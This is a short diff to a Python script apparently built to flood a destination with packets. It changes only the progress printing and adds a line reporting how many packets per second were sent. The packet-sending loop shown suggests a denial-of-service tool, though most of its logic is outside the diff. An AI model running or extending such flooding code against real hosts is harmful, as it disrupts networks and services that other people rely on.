@@ -38,7 +38,7 @@ def flood(dest, size, num_packets):
         counter += 1
         pkts.append(pkt)
 
-        print(str(round((i/num_packets)*100))+" %" +" done...", end='\r')
+        print(str(round((i/num_packets)*100,2))+" %" +" done...", end='\r')
 
         if counter == ceiling:
             counter = random.randint(0,91)
@@ -52,10 +52,11 @@ def flood(dest, size, num_packets):
         j+=1
         thread = threading.Thread(target=send(pkt, verbose = 0))
         thread.start()
-        print(str(round((j/num_packets)*100))+" %" +" done...", end='\r')
+        print(str(round((j/num_packets)*100,2))+" %" +" done...", end='\r')
 
     proctime = time.process_time()-proctime
     print(f'Done in {proctime} sec')
+    print(f'Sent {num_packets} packets at a rate of {round(num_packets/proctime,2)} packets/sec')       
     
 
 if len(sys.argv) != 4:
